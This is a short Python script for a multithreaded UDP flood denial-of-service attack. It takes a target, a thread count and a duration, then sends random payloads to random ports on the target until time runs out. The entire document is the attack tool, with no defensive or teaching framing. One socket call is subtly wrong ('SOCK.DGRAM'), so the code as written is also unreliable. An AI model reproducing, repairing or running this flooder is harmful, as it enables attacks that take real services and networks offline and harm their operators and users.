import socket, time, random, threading, sys

try: 
    Target, Threads, Timer = str(sys.argv[1]), int(sys.argv[2]), float(sys.argv[3])

except IndexError:
    print('\n[+] Usage: python ' + sys.argv[0] + ' <Target> <Threads> <Timer>> ')
    sys.exit(1)

Timeout = time.time() + Timer

def Attack(): 
    try:
        Bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK.DGRAM)
        while time.time() < Timeout:
            dport = random.randint(22,55500)
            sock.sendto(Bytes*random.randint(5,22), (Target,dport))
        return
    except Exception as Error:
        print(Error)

print('\n[+] Starting Attack...')

threads = []
for _ in range(Threads):
    thread = threading.Thread(target=Attack)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

print('\n[+] Attack completed.')
